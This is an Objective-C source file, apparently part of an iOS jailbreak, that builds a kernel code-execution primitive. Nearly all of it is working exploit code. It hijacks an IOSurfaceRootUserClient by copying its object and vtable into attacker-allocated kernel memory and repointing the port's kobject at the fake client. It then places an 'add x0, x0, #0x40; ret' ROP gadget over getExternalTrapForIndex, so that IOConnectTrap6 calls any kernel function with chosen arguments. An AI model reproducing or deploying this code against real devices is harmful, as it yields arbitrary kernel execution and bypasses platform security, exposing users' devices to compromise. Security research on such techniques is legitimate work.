
#import <pthread.h>
#import "kexecute.h"
#import "patchfinder64.h"
#import "ImportantHolders.h"
#import "IOKitLibTW.h"

#import "IOTypes.h"
#import "find_port.h"
#import "offsets.h"
#include "KernelUtils.h"

mach_port_t PrepareUserClient(void) {
    kern_return_t err;
    mach_port_t UserClient;
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    
    if (service == IO_OBJECT_NULL){
        printf(" [-] unable to find service\n");
        exit(EXIT_FAILURE);
    }
    
    err = IOServiceOpen(service, mach_task_self(), 0, &UserClient);
    if (err != KERN_SUCCESS){
        printf(" [-] unable to get user client connection\n");
        exit(EXIT_FAILURE);
    }
    printf("[+] kexecute: got user client: 0x%x\n", UserClient);
    return UserClient;
}

// TODO: Consider removing this - jbd runs all kernel ops on the main thread
pthread_mutex_t kexecuteLock;
static mach_port_t UserClient = 0;
static uint64_t IOSurfaceRootUserClient_Port = 0;
static uint64_t IOSurfaceRootUserClient_Addr = 0;
static uint64_t FakeVtable = 0;
static uint64_t FakeClient = 0;
const int fake_Kernel_alloc_size = 0x1000;

typedef int (*kexecFunc)(uint64_t function, size_t argument_count, ...);
static kexecFunc kernel_exec = 0;

void init_Kernel_Execute(void) {
    UserClient = PrepareUserClient();
    
    // From v0rtex - get the IOSurfaceRootUserClient port, and then the address of the actual client, and vtable
    IOSurfaceRootUserClient_Port = find_port_address(UserClient, MACH_MSG_TYPE_COPY_SEND); // UserClients are just mach_ports, so we find its address
    //
    //printf("Found port: 0x%llx\n", IOSurfaceRootUserClient_Port);
    
    IOSurfaceRootUserClient_Addr = ReadKernel64(IOSurfaceRootUserClient_Port + off_ip_kobject); // The UserClient itself (the C++ object) is at the kobject field
    //
    //printf("Found addr: 0x%llx\n", IOSurfaceRootUserClient_Addr);
    
    uint64_t IOSurfaceRootUserClient_vtab = ReadKernel64(IOSurfaceRootUserClient_Addr); // vtables in C++ are at *object
    //
    //printf("Found vtab: 0x%llx\n", IOSurfaceRootUserClient_vtab);
    
    // The aim is to create a fake client, with a fake vtable, and overwrite the existing client with the fake one
    // Once we do that, we can use IOConnectTrap6 to call functions in the kernel as the kernel
    
    
    // Create the vtable in the kernel memory, then copy the existing vtable into there
    FakeVtable = kmem_alloc(fake_Kernel_alloc_size);
    //
    //printf("Created FakeVtable at %016llx\n", FakeVtable);
    
    for (int i = 0; i < 0x200; i++) {
        WriteKernel64(FakeVtable+i*8, ReadKernel64(IOSurfaceRootUserClient_vtab+i*8));
    }
    
    //
    //printf("Copied some of the vtable over\n");
    
    // Create the fake user client
    FakeClient = kmem_alloc(fake_Kernel_alloc_size);
    //
    //printf("Created FakeClient at %016llx\n", FakeClient);
    
    for (int i = 0; i < 0x200; i++) {
        WriteKernel64(FakeClient+i*8, ReadKernel64(IOSurfaceRootUserClient_Addr+i*8));
    }
    
    //
    //printf("Copied the user client over\n");
    
    // Write our fake vtable into the fake user client
    WriteKernel64(FakeClient, FakeVtable);
    
    // Replace the user client with ours
    WriteKernel64(IOSurfaceRootUserClient_Port + off_ip_kobject, FakeClient);
    
    // Now the userclient port we have will look into our fake user client rather than the old one
    
    // Replace IOUserClient::getExternalTrapForIndex with our ROP gadget (add x0, x0, #0x40; ret;)
    WriteKernel64(FakeVtable+8*0xB7, find_add_x0_x0_0x40_ret());
    
    //
    //printf("Wrote the `add x0, x0, #0x40; ret;` gadget over getExternalTrapForIndex");
    
    pthread_mutex_init(&kexecuteLock, NULL);
}

void term_Kernel_Execute(void) {
    if (!UserClient) return;
    
    WriteKernel64(IOSurfaceRootUserClient_Port + off_ip_kobject, IOSurfaceRootUserClient_Addr);
    kmem_free(FakeVtable, fake_Kernel_alloc_size);
    kmem_free(FakeClient, fake_Kernel_alloc_size);
}

uint64_t Kernel_Execute(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
    
    if (kernel_exec) {
        return kernel_exec(addr, 7, x0, x1, x2, x3, x4, x5, x6);
    }
    
    pthread_mutex_lock(&kexecuteLock);
    
    // When calling IOConnectTrapX, this makes a call to iokit_UserClient_trap, which is the user->kernel call (MIG). This then calls IOUserClient::getTargetAndTrapForIndex
    // to get the trap struct (which contains an object and the function pointer itself). This function calls IOUserClient::getExternalTrapForIndex, which is expected to return a trap.
    // This jumps to our gadget, which returns +0x40 into our fake UserClient, which we can modify. The function is then called on the object. But how C++ actually works is that the
    // function is called with the first arguement being the object (referenced as `this`). Because of that, the first argument of any function we call is the object, and everything else is passed
    // through like normal.
    
    // Because the gadget gets the trap at UserClient+0x40, we have to overwrite the contents of it
    // We will pull a switch when doing so - retrieve the current contents, call the trap, put back the contents
    // (i'm not actually sure if the switch back is necessary but meh)
    
    printf("calling the wrong kernel execution\n");
    
    
    uint64_t offx20 = ReadKernel64(FakeClient+0x40);
    uint64_t offx28 = ReadKernel64(FakeClient+0x48);
    WriteKernel64(FakeClient+0x40, x0);
    WriteKernel64(FakeClient+0x48, addr);
    uint64_t returnval = IOConnectTrap6(UserClient, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6));
    WriteKernel64(FakeClient+0x40, offx20);
    WriteKernel64(FakeClient+0x48, offx28);
    
    pthread_mutex_unlock(&kexecuteLock);
    
    return returnval;
}
